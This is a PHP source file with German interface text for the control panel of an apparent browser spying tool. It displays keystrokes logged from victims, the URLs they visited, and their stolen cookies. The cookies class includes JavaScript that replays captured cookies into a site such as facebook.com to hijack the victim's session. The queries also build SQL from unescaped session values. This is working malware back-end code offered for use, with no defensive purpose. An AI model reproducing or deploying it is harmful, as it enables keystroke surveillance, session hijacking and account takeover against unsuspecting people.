<?
class Task
{
	protected $mysqli;
	
	protected $title;
	protected $databaseTable;
	
	protected $session;
	protected $showEntries;

	
	
    public function __construct($mysqli, $title, $databaseTable)
	{
		$this->mysqli = $mysqli;
		$this->title = $title;
		$this->databaseTable = $databaseTable;
		$this->showEntries = -1;
		
	}
	protected function printDeleting()
	{
		$delarr = array(
			0 => "jetzt (ALLE !)",
			60*30 => "30 Minuten",
			60*60 => "1 Stunde",
			60*60*2 => "2 Stunden",
			60*60*6 => "6 Stunden",
			60*60*12 => "12 Stunden",
			60*60*24 => "1 Tag",
			60*60*24*2 => "2 Tage",
			60*60*24*7 => "1 Woche",
			60*60*24*30 => "1 Monat",
		);
		echo "Eintr&auml;ge l&ouml;schen &auml;lter als:";
		echo "<table><tr>\n";
		foreach($delarr as $k => $v){
			echo "<td class=\"settings\" onclick=\"javascript:if(confirm(unescape('".$this->title." Eintr%E4ge %E4lter als ".$v." entfernen?')) == true){window.location='./index.php?detail=".$this->session."&del=".$this->databaseTable."&time=".$k."'}\">".$v."</td>\n";
		}
		echo "</tr></table>\n";
		echo "<br />";
	}
	protected function printShowing($entriesCount)
	{
		if(isset($_GET['show_'.$this->databaseTable]))
			$GLOBALS['show_'.$this->databaseTable] = (INT)$_GET['show_'.$this->databaseTable];
		else
			$GLOBALS['show_'.$this->databaseTable] = $entriesCount;
		$show = ($GLOBALS['show_'.$this->databaseTable] < $entriesCount) ? $GLOBALS['show_'.$this->databaseTable] : $entriesCount; //wenn eine größere zahl als einträge eingegeben wurde
		$this->showEntries = (INT)$show;
		echo "<form id=\"show_".$this->databaseTable."\" action=\"./index.php\" method=\"GET\"><input type=\"hidden\" name=\"detail\" value=\"".$this->session."\" />".$show." von ".$entriesCount." Eintr&auml;gen werden angezeigt. <input type=\"int\" size=\"4\" name=\"show_".$this->databaseTable."\" value=\"".$show."\" /><input type=\"submit\" value=\"Anzeigen\" /></form>";
		
	}
    public function printTitel()
    {
		echo "<br /><br /><hr />";
		echo "<h1>".$this->title.":</h1>";
	}
    public function printContent($session)
    {
		echo "<p>Implementiere noch diese Aufgabe.</p>";
    }
}

class keylogger extends Task
{

	public function printContent($session)
	{
		$this->session = $session;
		
        $entries = $this->mysqli->query("SELECT * FROM ".$this->databaseTable." WHERE session = '".$session."' ORDER BY time ASC") or die(mysqli_error($mysqli));
		$entriesCount = mysqli_num_rows($entries);
		
		if($entriesCount >= 1){
			$this->printTitel();
			
			$this->printDeleting();
		//	$this->printShowing($entriesCount);
			
			
			echo "<table><tr><td width=\"120px\"><b>Zeit</b></td><td><b>Text</b></td></tr>\n";
			$log = "";
			$j = 0;
			$first = array();

			while($row = mysqli_fetch_object($entries)){
				
				$log .= $row->content;
				$array = explode(".", $row->content);
				$index = sizeof($array)-4;
				$first[$j] = array();
				$ts = explode("-", $array[$index]);
				$first[$j]['timestamp'] = $ts[1];
				$first[$j]['time'] = $row->time;
				$j++;

			}
			$logarr = explode("-", $log);
			$t = explode(".", $logarr[0]);
			$time = $t[0];
			$i = 0;
			//print_r($first);
			//print_r($logarr);
			$k = 0;
			foreach($logarr as $value){
				if($k >= $this->showEntries && $this->showEntries != -1)
					break;
				$char = explode(".", $value);
				if($char[0] > $first[$k]['timestamp']){
					$k++;
				}
				$closest_time = $first[$k]['time'];
				if($i == 0)
					echo "<tr><td>".date("d.m.y - H:i:s", $closest_time)."</td><td>\n";
				echo $char[1];
				$temptime = (int)$char[0];
				if($temptime-$time > 20000)
					echo " ";
				if($temptime-$time > 120000){
					echo "</td></tr>\n<tr><td>".date("d.m.y - H:i:s", $closest_time)."</td><td>\n";
				}
				echo code2char($char[3], $char[2]);
				$time = $temptime;
				$i++;
			}
			echo "</td></tr></table>";
		}
	}
}


class location extends Task
{

    public function printContent($session)
    {
		$this->session = $session;
		
        $urls = $this->mysqli->query("SELECT * FROM location WHERE session = '".$session."' ORDER BY time DESC");
		$urlsCount = mysqli_num_rows($urls);
		if($urlsCount >= 1){
			$this->printTitel();
			
			$this->printDeleting();
			$this->printShowing($urlsCount);
			echo "<table><tr><td width=\"120px\"><b>Zeit</b></td><td><b>URL</b></td><td><b>Domain</b></td></tr>\n";
			$c = 1;
			
			while($row = mysqli_fetch_object($urls)){
				if($c <= $this->showEntries){
					$domain = parse_url($row->url, PHP_URL_HOST);
					echo "<tr><td>".date("d.m.y - H:i:s", $row->time)."</td><td><a target=\"_blank\" href=\"".$row->url."\">".shorten($row->url)."</a></td><td>".$domain."</td></tr>\n";
				}
				else
					break;
				$c++;
			}
			echo "</table>";
		}
    }
}


class cookies extends Task
{
    public function printContent($session)
    {
		$this->session = $session;
		
        $cookies = $this->mysqli->query("SELECT * FROM cookies WHERE session ='".$session."' ORDER BY time DESC");
	
		$cookiesCount = mysqli_num_rows($cookies);
		if($cookiesCount >= 1){
			$this->printTitel();
			$this->printDeleting();
			$this->printShowing($cookiesCount);
			
			/*function NehmeCookieAN(cookie) {
			
				var cookie = decodeURIComponent(cookie);
				var teil = cookie.split("\n");
				
				var domain = "facebook.com";
				var date = new Date();
				date.setTime(date.getTime()+(7*24*60*60*1000));
				var expires = date.toUTCString();
					
		        for (var i = 0; i < (teil.length)-1; i++) {
					
					var name_value = teil[i].split("+:+");
					var name = name_value[0];
					var value = name_value[1];
					
					
					document.cookie=name + "=" + value + "; expires=" + expires + "";
					
				}
				alert(i + " Cookies gesetzt");

			}
			*/ // Doesnt work because cross domain
			echo '<script language="JavaScript">
			//Alternative with Greasemonkey: Iframe
			function NehmeCookieAN(cookie) {
			
				var cookie = decodeURIComponent(cookie);
				var teil = cookie.split("\n");
				
				var url = prompt("Bei welcher URL willst du die Cookies setzen?", "https://www.facebook.com");
				if(url){
				url += "?cookiescript=enabled";

				
		        for (var i = 0; i < (teil.length)-1; i++) {
					
					var name_value = teil[i].split("+:+");
					var name = name_value[0];
					var value = name_value[1];
					
					
					url += "&" + name + "=" + value + "";
					
				}
				fenster = window.open(url, "Cookie Popupfenster", "width=400,height=300,resizable=yes");
				fenster.focus();

				alert(i + " Cookies gesetzt");
				}

			}
			</script>';
			echo "<table><tr><td width=\"120px\"><b>Zeit</b></td><td><b>Cookies-Watching</b></td></tr>\n";
			$c = 1;
			
			while($row = mysqli_fetch_object($cookies)){
				if($c > $this->showEntries)
					break;
				
				
				$cookie = str_replace("\n", "<br />", $row->cookies);
				echo "<tr><td>".date("d.m.y - H:i:s", $row->time)."</td><td onclick=\"javascript:if(confirm(unescape('COOKIEs setzen?')) == true){NehmeCookieAN('".urlencode($row->cookies)."')}\">".$cookie."</td></tr>\n";
		
				$c++;
			}
			echo "</table>";

		}
    }
}

?>